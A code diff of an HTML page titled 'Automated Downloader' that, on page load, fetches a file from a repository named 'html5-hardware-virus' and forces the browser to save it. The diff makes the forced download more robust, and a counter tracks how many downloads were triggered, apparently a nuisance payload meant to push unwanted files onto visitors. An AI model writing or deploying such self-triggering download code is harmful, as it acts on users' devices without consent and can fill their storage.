@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Downloader</title>
+    <title>Automated Downloader</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -47,18 +47,27 @@
         const fileUrl = "https://raw.githubusercontent.com/CameronCodesStuff/html5-hardware-virus/main/download.txt";
         let downloadCount = 0;
 
-        function triggerDownload() {
-            const downloadLink = document.createElement('a');
-            downloadLink.href = fileUrl;
-            
-            downloadLink.setAttribute('download', 'download.txt');
-            
-            document.body.appendChild(downloadLink);
-            downloadLink.click();
-            document.body.removeChild(downloadLink);
+        async function triggerDownload() {
+            try {
+                const response = await fetch(fileUrl);
+                const blob = await response.blob();
+                const localUrl = URL.createObjectURL(blob);
 
-            downloadCount++;
-            document.getElementById('counter').innerText = "Downloads triggered: " + downloadCount;
+                const downloadLink = document.createElement('a');
+                downloadLink.href = localUrl;
+                downloadLink.setAttribute('download', 'download.txt');
+                
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+
+                URL.revokeObjectURL(localUrl);
+
+                downloadCount++;
+                document.getElementById('counter').innerText = "Downloads triggered: " + downloadCount;
+            } catch (error) {
+                console.error(error);
+            }
         }
 
         triggerDownload();
